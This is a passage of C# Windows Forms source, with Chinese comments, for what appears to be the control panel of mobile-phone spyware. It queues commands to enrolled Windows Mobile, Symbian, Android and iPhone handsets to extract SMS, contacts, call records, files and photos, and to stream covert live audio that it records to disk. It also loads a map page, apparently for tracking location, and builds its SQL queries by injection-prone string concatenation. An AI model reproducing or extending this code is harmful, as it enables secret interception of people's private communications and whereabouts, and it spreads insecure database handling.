        // string sql = "insert into client (PhoneNum,PhoneID,SendTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + SendTime + "','" + Flag + "')";
        // string sql = "insert into Command (PhoneNum,Content,ComTime,Flag) values('" + PhoneNum + "','" + Content + "','" + ComTime + "','" + Flag + "')";
        // string sql = "insert into ALLCommand (PhoneNum,Content,ComTime,Flag) values('" + PhoneNum + "','" + Content + "','" + ComTime + "','" + Flag + "')"            

        //更新 执行中命令
        private void updata1()
        {
            dataGridView2.Enabled = false;
            string sql = "select * from Command";
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            OleDbDataAdapter da = new OleDbDataAdapter(sql, conn);           
            da.Fill(dt);         

            this.dataGridView2.DataSource = dt;
            conn.Close();
            //GridColumnStylesCollection myDataGridColStyle = this.dataGridView2.TableStyles[0].GridColumnStyles; 
            dataGridView2.Enabled = true;
            //dataGridView2.a

        }

        //更新 全部任务
        private void updata2()
        {
            string sql = "select * from ALLCommand";
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            OleDbDataAdapter da = new OleDbDataAdapter(sql, conn);            
            da.Fill(dt);         
            this.dataGridView2.DataSource = dt;
            conn.Close();
        }

        private void delete(string sql)
        {
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            datareader.Close();
            conn.Close();
        }

        private void ShowTreeInfo()
        {                    
            if (treeView1.Nodes[0].IsSelected == true)      
               updata2();           
            else
                if (treeView1.Nodes[2].IsSelected == true)                
                    updata1();
                else if (treeView1.Nodes[1].IsSelected == true)
                    tabControl1.SelectedTab = tabPage3;
        }
      
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            ShowTreeInfo();
        }
        //获取具体信息，将任务加入Command中
        public string SelectBefore =null; //定义一个全局变量保存刷新前选中的客户端信息

        private void GetInfo()
        {
            while (true)
            {
                if (treeView1.Nodes[0].IsSelected || treeView1.Nodes[1].IsSelected || treeView1.Nodes[2].IsSelected)
                    break;
                else
                {
                    if (treeView2.SelectedNode != null)
                    {
                        if (treeView2.SelectedNode.ImageIndex == 17)
                        {
                            MessageBox.Show("客户端未上线，暂不可监听");
                            break;
                        }
                    }
                    else
                    {
                        MessageBox.Show("请选择监听的客户端");
                        break;
                    }

                }

                SelectBefore = treeView2.SelectedNode.Text;
                string[] info = treeView2.SelectedNode.Text.Split(' ');
               
                string PhoneNum = info[0];
                string PhoneID = info[1];
                string OS = info[2];              

                string Content = null;
                string ComTime = System.DateTime.Now.ToString();
                string Flag = "Doing";
                //Mobile系统支持的命令
              if(OS.CompareTo("Mobile")==0)
              {
                if (treeView1.Nodes[3].Nodes[0].IsSelected == true)
                    Content = "FileInfor";
                else if (treeView1.Nodes[3].Nodes[1].IsSelected == true)
                    Content = "Message";
                else if (treeView1.Nodes[3].Nodes[2].IsSelected == true)
                    Content = "SimPhoneNum";
                else if (treeView1.Nodes[3].Nodes[3].IsSelected == true)
                    Content = "OutLookPhoneNum";
                else if (treeView1.Nodes[3].Nodes[4].IsSelected == true)
                    Content = "Appointment";                 
                else if (treeView1.Nodes[3].Nodes[5].IsSelected == true)
                    Content = "Task";
                else if (treeView1.Nodes[3].Nodes[8].IsSelected == true)
                    Content = "CallRecord";
                else if (treeView1.Nodes[3].Nodes[10].IsSelected == true)
                    Content = "Image";
                else if (treeView1.Nodes[3].Nodes[7].IsSelected == true)
                {
                    Content = "Stop";
                   /* if (iface != null)
                        iface.BeClose();*/
                }
                else if (treeView1.Nodes[3].Nodes[6].IsSelected == true)
                {
                    if (!Only())
                    {
                        Content = "Voice";
                        //MessageBox.Show(Content);
                        //iface = new Interface();                           //Windows Mobile的语音处理  
                        //iface.Ini(FileNow);
                        //Ini(FileNow);             //0704
                    }
                    else
                        MessageBox.Show("只可监听一个终端");
                }
                else if (treeView1.Nodes[3].Nodes[9].IsSelected == true )
                {
                    ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                    set.Show();                  

                }
                //start - 20111109
                /*
                else if (treeView1.Nodes[3].Nodes[11].IsSelected == true) {
                    Content = "ColorMsg";
                }
                else if (treeView1.Nodes[3].Nodes[12].IsSelected == true) {
                    Content = "EMail";
                }
                 */
                //end - 20111109
                else
                    MessageBox.Show("此手机系统暂不支持该命令");
               
               }

                //Symbian系统支持的命令
              if (OS.CompareTo("Symbian") == 0)
              {
                 
                  if (treeView1.Nodes[3].Nodes[1].IsSelected == true)
                      Content = "Message";
                  else if (treeView1.Nodes[3].Nodes[2].IsSelected == true)
                      Content = "SimPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[3].IsSelected == true)
                      Content = "OutLookPhoneNum";                 
                  else if (treeView1.Nodes[3].Nodes[8].IsSelected == true)
                      Content = "CallRecord";
                  else if (treeView1.Nodes[3].Nodes[10].IsSelected == true)
                      Content = "Image";
                  else if (treeView1.Nodes[3].Nodes[7].IsSelected == true)
                  {
                      Content = "Stop";                   
                  }
                  else if (treeView1.Nodes[3].Nodes[6].IsSelected == true)
                  {
                      if (!Only())
                      {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("只可监听一个终端");
                  }
                  //start - 20111109
                  /*
                  else if (treeView1.Nodes[3].Nodes[11].IsSelected == true) {
                      Content = "ColorMsg";
                  }
                  else if (treeView1.Nodes[3].Nodes[12].IsSelected == true) {
                      Content = "EMail";
                  }*/
                  //end - 20111109
                  else
                      MessageBox.Show("此手机系统暂不支持该命令");
               
              }

              if (OS.CompareTo("Android") == 0)
              {
                  if (treeView1.Nodes[3].Nodes[0].IsSelected == true)
                      Content = "FileInfor";
                  else if (treeView1.Nodes[3].Nodes[1].IsSelected == true)
                      Content = "Message";
                  else if (treeView1.Nodes[3].Nodes[2].IsSelected == true)
                      Content = "SimPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[3].IsSelected == true)
                      Content = "OutLookPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[4].IsSelected == true)
                      Content = "Appointment";              
                  else if (treeView1.Nodes[3].Nodes[8].IsSelected == true)
                      Content = "CallRecord";
                  //20111220 android照相功能暂不能使用
                  /*else if (treeView1.Nodes[3].Nodes[10].IsSelected == true)
                      Content = "Image";
                  */else if (treeView1.Nodes[3].Nodes[7].IsSelected == true)
                  {
                      Content = "Stop";                     
                  }
                  else if (treeView1.Nodes[3].Nodes[6].IsSelected == true)
                  {
                      if (!Only())
                      {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("只可监听一个终端");
                  }
                  else if (treeView1.Nodes[3].Nodes[9].IsSelected == true)
                  {
                      ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                      set.Show();


                  }
                  //start - 20111109
                  else if (treeView1.Nodes[3].Nodes[11].IsSelected == true) {
                      Content = "ColorMsg";
                  }
                  /*
                  else if (treeView1.Nodes[3].Nodes[12].IsSelected == true) {
                      Content = "EMail";
                  }*/
                  //end - 20111109
                  else
                      MessageBox.Show("此手机系统暂不支持该命令");

              } else if(OS.CompareTo("IPhone") == 0){
                  if (treeView1.Nodes[3].Nodes[0].IsSelected == true)
                      Content = "FileInfor";
                  else if (treeView1.Nodes[3].Nodes[1].IsSelected == true)
                      Content = "Message";
                  else if (treeView1.Nodes[3].Nodes[2].IsSelected == true)
                      Content = "SimPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[3].IsSelected == true)
                      Content = "OutLookPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[4].IsSelected == true)
                      Content = "Appointment";
                  else if (treeView1.Nodes[3].Nodes[8].IsSelected == true)
                      Content = "CallRecord";
                  else if (treeView1.Nodes[3].Nodes[10].IsSelected == true)
                      Content = "Image";
                  else if (treeView1.Nodes[3].Nodes[7].IsSelected == true) {
                      Content = "Stop";
                  }
                  else if (treeView1.Nodes[3].Nodes[6].IsSelected == true) {
                      if (!Only()) {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("只可监听一个终端");
                  }
                  else if (treeView1.Nodes[3].Nodes[9].IsSelected == true) {
                      ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                      set.Show();


                  } else
                      MessageBox.Show("此手机系统暂不支持该命令");
              }
              
                if (Content != null)
                {
                    string sql = "insert into Command(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    string sql1 = "insert into ALLCommand(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    
                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql);//插入任务到“执行中”列表中
                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql1);//插入任务到“全部任务”列表中                  
                    updata1();                  
                }

                break;
            }
        }
        private void treeView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

            GetInfo();
        }



        #region
       
        int i = 0;
        #region  取命令
        private bool Only()
        {
            string[] CommandDo = new string[100];
            string Content;
            int i = 0;
            bool have = false;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";  //获取应用程序域当前路径 debug所在路径
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Command ";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            while (datareader.Read())
            {

                Content = datareader["Content"].ToString();
                if (Content.CompareTo("Voice") == 0)
                {
                    have = true;
                    break;
                }


            }
            conn.Close();

            return have;


        }
        #endregion
        private string[] GetCommand(string PhoneID, string PhoneNum_1, string OS)
        {
            string[] CommandDo = new string[100];
            string PhoneNum, Content;
            int i = 0;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            //查找上一次命令状态
            string state = "select * from client where PhoneID = '" + PhoneID + "' and PhoneNum = '" + PhoneNum_1 + "'";
            OleDbCommand myCmd_1 = new OleDbCommand(state, conn);
            OleDbDataReader datareader_1 = myCmd_1.ExecuteReader();

            while (datareader_1.Read()) {
                string LastOrderTime = datareader_1["LastOrderTime"].ToString();
                string Finished = datareader_1["Finished"].ToString();

                bool send = false;
                //己经结束或者是第一次
                if ((Finished.CompareTo("1")==0) || (Finished.CompareTo("")==0)) {
                    send = true;
                }

                //以前有还没有结束,判断是否超过一分钟
                if (Finished.CompareTo("0") == 0) {
                    if (LastOrderTime.CompareTo("") == 0) {
                        send = true;
                    } else {
                        //检查是否过期 超过两分钟 则设为Off
                        System.DateTime date3 = Convert.ToDateTime(LastOrderTime);
                        System.DateTime ComTime = System.DateTime.Now;
                        System.TimeSpan diff2 = ComTime - date3;
                        //30秒
                        if (diff2.TotalSeconds > 30) {
                            send = true;
                        }
                    }
                } 
                if (send) {
                    //看是否有命令
                    string sql = "select * from Command  where PhoneID = '" + PhoneID + "'";
                    OleDbCommand myCmd = new OleDbCommand(sql, conn);
                    OleDbDataReader datareader = myCmd.ExecuteReader();
                    while (datareader.Read()) {
                        // i++;
                        PhoneNum = datareader["PhoneIMSI"].ToString();
                        Content = datareader["Content"].ToString();
                        //string task = PhoneNum + "@" + Content;
                        //MessageBox.Show(task);
                        CommandDo[i++] = Content;
                        deleteCommand(PhoneID, Content);

                        //更新Client
                        string now = System.DateTime.Now.ToString();
                        string update = "update Client set Finished ='" + "0" + "', LastOrderTime = '" + now + "'where  PhoneID = '" + PhoneID + "'and PhoneNum='" + PhoneNum_1 + "'";
                        OleDbCommand upp = new OleDbCommand(update, conn);
                        upp.ExecuteNonQuery();
                        break;
                    }
                }
                break;
            }
            conn.Close();
            return CommandDo;
        }

        #endregion
        private void deleteCommand(string PhoneID, string content)
        {
            string sql = "delete from Command where PhoneID=" + "'" + PhoneID + "'and Content=" + "'" + content + "'";        
            delete(sql);          
        }

        # endregion                 
        
        #region Symbian语音的操作
        string MyFileName = AppDomain.CurrentDomain.BaseDirectory + "1.amr";
        string MyFileName2 = AppDomain.CurrentDomain.BaseDirectory + "2.amr";
        string MyFileName11 = AppDomain.CurrentDomain.BaseDirectory + "1.wav";
        string MyFileName21 = AppDomain.CurrentDomain.BaseDirectory + "2.wav";
        string MyFileTest = AppDomain.CurrentDomain.BaseDirectory + "test.amr";
        Thread TempThreadS; //Symbian接收语音文件线程
        Thread playVoice;//播放语音文件线程
       
     
        int sign = 1;//接收文件标志位
        int play = 0;//播放文件标志位
        int i1, j = 0;     
      
        FileStream fs1;
        BinaryWriter wb1;
        FileStream fs2;
        BinaryWriter wb2;
    
        IPEndPoint RemoteIPEndPoint = new IPEndPoint(IPAddress.Any, 0);//远程发送节点    
        MusicPlayer music = new MusicPlayer();   //0220
        public int temp = 0;//0220   
        private void yuyinS()
        {       
            TempThreadS = new Thread(new ThreadStart(this.ReceiveFile1));//接收语音文件线程
            TempThreadS.IsBackground = true;
            TempThreadS.Start();
            playVoice = new Thread(new ThreadStart(this.playvoice1));//播放语音文件线程
            playVoice.IsBackground = true;
            playVoice.Start();      
        }
        private void StopyuyinS()
        {
            try
            {
                if (TempThreadS.IsAlive)
                {
                    //TempThreadS.Sleep(1);
                    TempThreadS.Join();
                }             
                if (playVoice.IsAlive)
                {
                  //   playVoice.Sleep(1);
                     playVoice.Join();
                }
            }
            catch (Exception e)
            {
                MessageBox.Show("停止S语音" + e.ToString());
            }
        }
     
   
        public void ReceiveFile1()  
        {
          
             while(true)
             {
                Socket symbiany = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                symbiany.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 20 * 1000);
                IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("2008"));
                Byte[] send = Encoding.ASCII.GetBytes("MonVoice");
                try
                {              

                  while (true)
                  {
                       send = Encoding.ASCII.GetBytes("MonVoice");
                      try
                      {
                          if (symbiany.Connected)
                          {
                              break;
                          }
                          else
                          {
                              symbiany.Connect(sever);
                              break;
                          }
                      }
                      catch
                      {

                      }
                  }

                  TransferFiles.SendVarData(symbiany, send); 
                         
                  subYuyinS(symbiany);  

              }
              catch//(Exception e)
              {
                  if (symbiany != null)
                      symbiany.Close();
                  //MessageBox.Show("S语音接收" + e.ToString());
              }
             }
        }

              

    public void subYuyinS(Socket symbiany)
    {
        //while (true)
        //{           
        //try
        //    {
                while (true)
                {
                    Byte[] receiveBytes = TransferFiles.ReceiveVarData(symbiany);
                    //  symbiany.Receive(receiveBytes, receiveBytes.Length, 0);
                    //MessageBox.Show("1");
                    if (receiveBytes.Length == 0)
                        break;
                    //MessageBox.Show("2");
                    toolStripStatusLabel1.Text = "Symbian语音接收";
                    if (FileNow == null)
                        break;
                    //MessageBox.Show("3");
                    RecordS(receiveBytes);//语音记录保存                  
                    //MessageBox.Show("4");
                    if (sign == 1)  //用1.amr来接收文件
                    {
                        if (File.Exists(MyFileName11))
                            File.Delete(MyFileName11);

                        if (!File.Exists(MyFileName))
                            CreatFileHead(MyFileName);
                        FileInfo f1 = new FileInfo(MyFileName);
                        i1 = Int32.Parse(f1.Length.ToString());
                        //  if (i1 < 5 * 1024)
                        if (i1 < 14 * 1024)
                        {

                            fs1 = new FileStream(MyFileName, FileMode.Append);
                            wb1 = new BinaryWriter(fs1);
                            wb1.Write(receiveBytes);
                            wb1.Close();
                            fs1.Close();

                        }
                        else
                        {
                            sign = 2;  //接收标志为2，用2.amr来接收
                            play = 1;//播放标志为1 ，表明可以播放1.amr

                            if (!File.Exists(MyFileName2))
                                CreatFileHead(MyFileName2);
                            FileInfo f2 = new FileInfo(MyFileName2);
                            j = Int32.Parse(f2.Length.ToString());

                            fs2 = new FileStream(MyFileName2, FileMode.Append);
                            wb2 = new BinaryWriter(fs2);
                            wb2.Write(receiveBytes);
                            wb2.Close();
                            fs2.Close();


                        }
                    }
                    else
                    {
                        if (sign == 2)//用2.amr来接收文件
                        {
                            if (File.Exists(MyFileName21))
                                File.Delete(MyFileName21);

                            if (!File.Exists(MyFileName2))
                                CreatFileHead(MyFileName2);
                            FileInfo f2 = new FileInfo(MyFileName2);
                            j = Int32.Parse(f2.Length.ToString());
                            //   if (j < 5 * 1024)
                            if (j < 14 * 1024)
                            {
                                fs2 = new FileStream(MyFileName2, FileMode.Append);
                                wb2 = new BinaryWriter(fs2);
                                wb2.Write(receiveBytes);
                                wb2.Close();
                                fs2.Close();

                            }

                            else
                            {
                                sign = 1;
                                play = 2;

                                if (File.Exists(MyFileName11))
                                    File.Delete(MyFileName11);

                                if (!File.Exists(MyFileName))
                                    CreatFileHead(MyFileName);
                                FileInfo f1 = new FileInfo(MyFileName);
                                i1 = Int32.Parse(f1.Length.ToString());

                                fs1 = new FileStream(MyFileName, FileMode.Append);
                                wb1 = new BinaryWriter(fs1);
                                wb1.Write(receiveBytes);
                                wb1.Close();
                                fs1.Close();

                            }
                        }
                    }
                }
               
            //}
        //    catch 
        //    {
               
        //    }
        //}
}
        public void playvoice1() //20110108原始函数
        {
            
            while (true)
           {                
                try
                {
                   Thread.Sleep(1000);
                   if(play==1)
                    {                  
                        
                        string path = AppDomain.CurrentDomain.BaseDirectory + "test1.exe";
                        System.Diagnostics.Process.Start(path);
                        string pathPlay = AppDomain.CurrentDomain.BaseDirectory + "WAVPlayer.exe"; 
                        Thread.Sleep(3000);                       
                        Process newProc = System.Diagnostics.Process.Start(pathPlay, MyFileName11);  
                        play = 0;                  
                        newProc.WaitForExit();                  
                    }
                  if (play==2)
                    {            

                        string path = AppDomain.CurrentDomain.BaseDirectory + "test.exe";
                        System.Diagnostics.Process.Start(path);          
                        Thread.Sleep(3000);                        
                        Process newProc1 = System.Diagnostics.Process.Start("WAVPlayer.exe", MyFileName21);
                        play = 0;
                        newProc1.WaitForExit();                        
                    }
                }
                catch(Exception  e)
                {
                    MessageBox.Show(e.ToString());
                }
           }
        }

        //录音保存的函数
        public void FileVoiceCreate(string PhoneID, string PhoneNum,string OS)
        {
            //在Debug\ReceviceFile\Voice中建立一个以当前日期命名的文件夹
           // string RTime = System.DateTime.Now.ToShortDateString();
            string RTime = System.DateTime.Now.ToString("yyyy-MM-dd");
            string fileSub = "Voice\\" + RTime;
            string path = FileCreateSub(fileSub);

            //文件命名 时间获取   文件格式 34567890@1342222222@2011-2-16 20;59;08.amr
            //string TimeFull = System.DateTime.Now.ToString();
            string TimeFull = System.DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss");
            string Name = TimeFull.Replace(':', ';');

            //创建文件，并预先写入头文件
            if (OS.CompareTo("Symbian") == 0)
            {
                string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".amr";
                string fileFullName = path + "\\" + RecordFileName;
                FileNow = fileFullName;
                CreatFileHead(FileNow);
            }
            else if (OS.CompareTo("Mobile") == 0)
            {
                string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".wav";
                string fileFullName = path + "\\" + RecordFileName;
                FileNow = fileFullName;            
            }
            else if (OS.CompareTo("Android") == 0)
            {
                //string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".wav";
                string RecordFileName = Name + ".wav";
                string fileFullName = path + "\\" + RecordFileName;
                FileNow = fileFullName;             
            }

        }
        public void RecordS(Byte[] receiveBytes)
        {
            FileStream fs = new FileStream(FileNow, FileMode.Append);
            BinaryWriter wb = new BinaryWriter(fs);
            wb.Write(receiveBytes);
            wb.Close();
            fs.Close();
        }

        public void CreatFileHead(string MyFileName)  //创建一个文件，并预先写入AMR的二进制的头
        {

            byte[] KAMRNBHeader ={ 0x23, 0x21, 0x41, 0x4d, 0x52, 0x0a };

            FileStream fs = new FileStream(MyFileName, FileMode.Create);
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(KAMRNBHeader);
            bw.Close();
            fs.Close();
        }

       

        #endregion

        #region  Mobile语音处理
        Thread TempThreadM; //Mobile接收语音文件线程
        private void yuyinM()
        {
           TempThreadM = new Thread(new ThreadStart(this.ReceiveFileM));//接收语音文件线程
           TempThreadM.IsBackground = true;
           TempThreadM.Start();
        }
        public void ReceiveFileM()
        {
            while (true)
            {
                Socket mobiley = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                mobiley.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 20 * 1000);
                IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("10002"));
                Byte[] send = Encoding.ASCII.GetBytes("MonVoice");
                try
                {


                    while (true)
                    {
                        send = Encoding.ASCII.GetBytes("MonVoice");
                        try
                        {
                            if (mobiley.Connected)
                            {
                                break;
                            }
                            else
                            {
                                mobiley.Connect(sever);
                            }
                        }
                        catch
                        {

                        }
                    }
                    TransferFiles.SendVarData(mobiley, send);
                    subYuyinM(mobiley);

                }
                catch
                {
                    if (mobiley != null)
                        mobiley.Close();
                }

            }
        }



        public void subYuyinM(Socket mobiley)
        {

            try
            {
                while (true)
                {
                    Byte[] receive = TransferFiles.ReceiveVarData(mobiley);
                    string sTemp1 = Encoding.ASCII.GetString(receive);
                    if (receive.Length == 0)
                        break;



                    toolStripStatusLabel1.Text = "Mobile语音接收";
                    iface.PlayBuffer(sTemp1,sTemp1.Length);
                }
               
                
            }
            catch(Exception e)
            {
                MessageBox.Show("Mobile语音" + e.ToString());
               
            }

        }

        private void test(ref sbyte[] name,int len)
        {

            sbyte[] testsbyte = new sbyte[len];
            for (int i = 0; i < len; i++)
            {
                testsbyte[i] = name[i];
            }
        }
        private void StopyuyinM()
        {
            try
            {
                if (TempThreadM != null)
                TempThreadM.Abort();
            }
            catch(Exception e)
            {
                MessageBox.Show("停止M语音" + e.ToString());
            }
        }

       
        public void CreatFileHeadM(string MyFileName)  //创建一个文件，并预先写入MAV的二进制的头
        {

            byte[] KAMRNBHeader = { 0x23, 0x21, 0x41, 0x4d, 0x52, 0x0a };

            FileStream fs = new FileStream(MyFileName, FileMode.Create);
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(KAMRNBHeader);
            bw.Close();
            fs.Close();
        }

        #endregion
      
        Thread ThreadTrany;
        Thread sendMy;


        public void login() //控制端上线，通知第三方
        {
            try {
                sendMy = new Thread(new ThreadStart(loginT));
                sendMy.IsBackground = true;
                sendMy.Start();
            } catch {
                //异常处理
            }
            

            
        }
        private void TOrder()  //命令的发送
        {
            ThreadTrany = new Thread(new ThreadStart(Order));
            ThreadTrany.IsBackground = true;
            ThreadTrany.Start();
            if (this.IsDisposed)
                return;
        }

        public string FileCreateSub(string file)
        {
            //创建每个手机对应的文件夹
            string path = AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile\\" + file;
            if (Directory.Exists(AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile\\" + file))
            {
                //  MessageBox.Show("directory exists");  //C#创建文件夹  
            }
            else
            {
                Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile\\" + file);
                // MessageBox.Show("done");
            }
            return path;

        }
        public void ClientOnline(string PhoneNum, string PhoneID,string OS)
        {
            string PhoneNumO, PhoneIDO, TimeO, FlagO,OSO;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Client ";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            string ComTime = System.DateTime.Now.ToString();
            string Flag = "On";
            bool hv = false;
            while (datareader.Read())
            {

                PhoneNumO = datareader["PhoneNum"].ToString();
                PhoneIDO = datareader["PhoneID"].ToString();
                TimeO = datareader["SendTime"].ToString();
                FlagO = datareader["Flag"].ToString();
                OSO = datareader["OS"].ToString();
                string sqlT = "update Client set Flag ='" + "On" + "', SendTime = '" + ComTime + "',OS='" + OS + "'where  PhoneID = '" + PhoneIDO + "'and PhoneNum='" + PhoneNumO + "'";
                if (PhoneNumO.CompareTo(PhoneNum) == 0 && PhoneIDO.CompareTo(PhoneID) == 0 && OSO.CompareTo(OS) == 0)
                {
                    //OleDbCommand myCmd1 = new OleDbCommand(sqlT, conn);
                    //myCmd1.ExecuteNonQuery();
                    hv = true;

                }

            }
            conn.Close();

            if (hv == false)  //没有记录时
            {

                string sqlI = "insert into client (PhoneNum,PhoneID,SendTime,Flag,OS) values('" + PhoneNum + "','" + PhoneID + "','" + ComTime + "','" + Flag + "','" + OS + "')";
                IntoDatabase1(PhoneNum, PhoneID, ComTime, Flag,OS, sqlI);
                clientTree = true; //开启更新客户端列表
                //GetTree();
            }

        }

        //webBrowser加载WEB页面
        private void loadingPage()
        {
            String urlPath = Path.GetFullPath(System.AppDomain.CurrentDomain.BaseDirectory + "BaiduMap/BDMap.htm").Replace(Path.DirectorySeparatorChar, '/'); ;
            urlPath = "file:\\" + urlPath;
            //MessageBox.Show(urlPath);
            LocMap.Navigate(urlPath);
        }



        private void timer2_Tick(object sender, EventArgs e)
        {
            if (clientTree)
            {
                GetTreeTest();
                clientTree = false;
            }
        }

        #region 加载文档管理的树状结构
        private void jiazai()
        {

            //得到接收文件的目录
            string ReceviceFile = AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile";
            
            MyNode mn = new MyNode(ReceviceFile, true);
            this.treeView9.Nodes.Clear();//0222
            this.listView4.Clear();//0222
            this.treeView9.Nodes.Add(mn);


            this.listView4.Columns.Add("名称", (this.listView4.Width / 5)*2, HorizontalAlignment.Center);
            this.listView4.Columns.Add("大小", (this.listView4.Width / 10), HorizontalAlignment.Center);
            this.listView4.Columns.Add("类型", this.listView4.Width / 10, HorizontalAlignment.Center);
            this.listView4.Columns.Add("修改时间", this.listView4.Width / 5, HorizontalAlignment.Center);
            this.listView4.Columns.Add("保存位置", this.listView4.Width / 5, HorizontalAlignment.Center);
            this.listView4.View = View.Details;
        }   

       

        private void treeView9_AfterSelect(object sender, TreeViewEventArgs e)
        {
            try
            {
                this.listView4.Items.Clear();

                MyNode mn = (MyNode)e.Node;
                if (mn.isLoadFiles == false && mn.Nodes.Count == 0)               
                {
                    DirectoryInfo di = new DirectoryInfo(mn.MyPath);
                    this.listView4.Items.Clear();             

                    foreach (DirectoryInfo d in di.GetDirectories())//如果为文件夹
                    {
                        mn.Nodes.Add(new MyNode(d.FullName, false));
                        ListViewItem lvi = this.listView4.Items.Add(d.Name);
                        lvi.SubItems.Add("");
                        lvi.SubItems.Add("文件夹");
                        lvi.SubItems.Add(d.LastAccessTime.ToString());
                        lvi.SubItems.Add(d.FullName);                        
                        lvi.ImageIndex = 18;//设置图标

                    }
                    foreach (FileInfo f in di.GetFiles())//如果为文件
                    {

                        ListViewItem lvi = this.listView4.Items.Add(f.Name, 0);//加载文件名及图标

                        float temp2 = 0;
                        string t;
                        float TotalSize = (float)f.Length;
                        float temp1 = TotalSize / 1024;
                     

                        if (temp1 > 1024)
                        {
                            temp2 = temp1 / 1024;
                            float temp = float.Parse(temp2.ToString("#0.00"));
                           // t = temp2.ToString() + "MB";
                            t = temp.ToString() + "MB";

                        }
                        else if (temp1 < 1)
                        {
                            t = "1KB";
                        }
                        else
                        {
                            float temp = float.Parse(temp1.ToString("#0.00"));
                            t = temp.ToString() + "KB";
                        }

                        lvi.SubItems.Add(t);
                        lvi.SubItems.Add("文件");
                        lvi.SubItems.Add(f.LastAccessTime.ToString());
                        lvi.SubItems.Add(f.FullName);
                    }
                }
            }
            catch
            {
            }
        }

        private void treeView9_AfterCheck(object sender, TreeViewEventArgs e)
        {
            //上下两段代码可以任选其一测试

            bool isChecked = true;//定义一个BOOL值

            TreeNode parentNode = e.Node.Parent;//得到当前选中的节点的父节点
            if (parentNode == null)//如果没有父节点 则返回
                return;
            TreeNode tn = parentNode.FirstNode;//得到父节点的的一个节点
            while (tn != null)//如果不为空
            {
                if (tn.Checked == false)//如果此节点没有选中
                {
                    isChecked = false;//BOOL为FALSE
                    break;//跳出
                }
                tn = tn.NextNode;//移至下一个节点
            }
            parentNode.Checked = isChecked;//根据BOOL值判断父节点是否选中
        }

